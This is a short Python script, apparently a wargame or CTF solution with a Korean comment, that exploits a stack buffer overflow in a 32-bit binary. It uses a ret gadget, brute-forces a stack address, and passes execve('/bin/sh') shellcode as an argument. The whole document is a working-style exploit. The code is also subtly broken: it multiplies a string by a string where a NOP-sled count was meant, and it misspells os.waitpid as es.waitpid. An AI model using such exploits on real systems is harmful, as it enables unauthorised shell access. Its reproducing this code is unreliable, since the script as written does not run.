'''
ret가젯을 이용한 풀이
ret주소 = 0x804851e
'''

import os,sys

target=os.getcwd()+"/"+sys.argv[1]

shell="\x90"*"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

for h in range(0xff,0x00,-1):
	for l in range(0x00,0x100,50):
		payload="a"*44+"\x1e\x85\x04\x08"
		payload=payload+chr(l)+chr(h)+"\xff\xbf"
		pid=os.fork()
		if pid==0:
			os.execl(target,target,payload,shell)
		else:
			es.waitpid(pid,0)